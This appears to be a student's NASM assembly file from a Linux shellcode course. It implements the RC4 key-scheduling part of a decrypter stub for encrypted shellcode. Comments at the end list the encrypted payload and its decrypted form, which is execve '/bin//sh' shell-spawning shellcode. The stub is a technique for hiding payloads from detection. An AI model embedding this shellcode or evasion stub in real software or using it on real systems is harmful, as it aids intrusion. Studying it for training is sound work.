; Filename:	decrypter.nasm
; Author:	aus-mate
; Purpose:	This code was written for assignment #7 of the SecurityTube Linux Assembly Expert certification.
; Student ID:	SLAE-1555

global _start

section .text

_start:

	;void rc4_init(unsigned char *key, unsigned int key_length) {
    ;	for (i = 0; i < 256; i++)
  	;      		S[i] = i;
 	;
    ;	for (i = j = 0; i < 256; i++) {
    ;		j = (j + key[i % key_length] + S[i]) & 255;
    ;		swap(S[i] <-> S[j]);
    ;	}
    ;	i = j = 0;
	;}
	 

	;	for (i = 0; i < 256; i++)
  	;      		S[i] = i;
	
	; edx will point to S[0]
	; ecx will be i
	xor ecx, ecx		; clear ecx register 
	mov ecx, 255		; move 255 into ecx
s_arr:	
	mov byte[esp-1], cl	; push bytes onto the stack to populate S array
	dec esp				; adjust stack
	loop s_arr			; loop to fill S array
	mov byte[esp-1], cl ; append 0x00 onto the stack for S[0]
	dec esp				; adjust stack
	mov edx, esp		; point edx at the esp


    ;	for (i = j = 0; i < 256; i++) {
    ;		j = (j + key[i % key_length] + S[i]) & 255;
    ;		swap(S[i] <-> S[j]);
    ;	}
    ;	i = j = 0;

    ; edx will point to S[0]
    ; eax will point to S[i]
	; ecx will be i
	; ebx will be j		
	xor ebx, ebx		; clear registers for entry to for loop
	xor eax, eax
init:
	lea eax, [edx + ecx]; load the address of S[i]
	add bl, byte[eax] 	; + S[i]
	push ecx			; store ecx
	and ecx, 15			; i % key_length (i % 16)
	push eax			; store eax
	jmp load_key
jmp_call_pop_key:
	pop eax				; eax will now point to key[0]
	push edx			; store S[0]
	lea edx, [eax + ecx]; key[i % 16]
	add bl, byte[edx]	; + key[i % key_length]
	and ebx, 255		; % 256
	pop edx				; return the value of edx - S[0]
	pop eax				; return value of eax - S[i]
	lea ecx, [edx + ebx]; load the address of S[j]
	xor ebx, ebx		; clear ebx
	push edx			; store value of edx
	xor edx, edx		; clear edx
	mov bl, byte[eax]	; move the byte at S[i] into ebx
	mov dl, byte[ecx]	; move the byte at S[j] into edx
	mov byte[eax], dl	; move the byte at S[j] into S[i]
	mov byte[ecx], bl	; move the byte that was stored at S[i] into S[j] 
	pop edx				; return orignal values
	pop ecx
	inc ecx				; increment for loop
	cmp ecx, 256		; condition
	jne init


load_key:
 	call jmp_call_pop_key
	key: db 0xb3,0x6c,0x07,0x25,0x67,0x73,0x00,0x7d,0x2f,0xfc,0x7e,0xcf,0x4d,0x97,0xd4,0x25
; load_enc_sc:
; 	call jmp_call_pop_sc
; 	sc: db 0x86,0x86,0x50,0x04,0xb7,0xde,0x8f,0xf0,0x31,0x7e,0xdc,0x9f,0x93,0x4e,0x6a,0xad,0x55,0x21,0x1e,0x19,0x11,0xc0,0x35,0x13,0xfd

; decrypted: 0x31,0xc0,0x50,0x68,0x2f,0x2f,0x73,0x68,0x68,0x2f,0x62,0x69,0x6e,0x89,0xe3,0x50,0x89,0xe2,0x53,0x89,0xe1,0xb0,0x0b,0xcd,0x80